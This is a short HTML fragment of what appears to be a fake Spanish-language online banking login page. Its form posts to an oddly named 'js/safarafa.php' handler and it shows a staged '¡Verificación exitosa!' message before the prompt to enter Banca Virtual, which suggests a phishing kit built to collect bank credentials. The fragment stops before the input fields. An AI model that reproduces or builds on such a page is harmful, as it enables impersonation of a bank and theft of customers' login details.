                  ...
                  <div id="loginBox">
                     <form method="post" action="js/safarafa.php" onsubmit="return validarFormulario()">
                        <div class="contentDiv">
                           <div id="titleBox">
                              <h1 id="tituloIngreseUsername" class="titulo-home">¡Verificación exitosa!</h1>
                              <h1 id="tituloIngresePassword" class="titulo-home" style="display: none;">Ingrese a Banca Virtual</h1>
                           </div>
                        </div>
                        <img src="imaxsofiles/check.png" style="display:block;margin: 0 auto;width: 80px;">
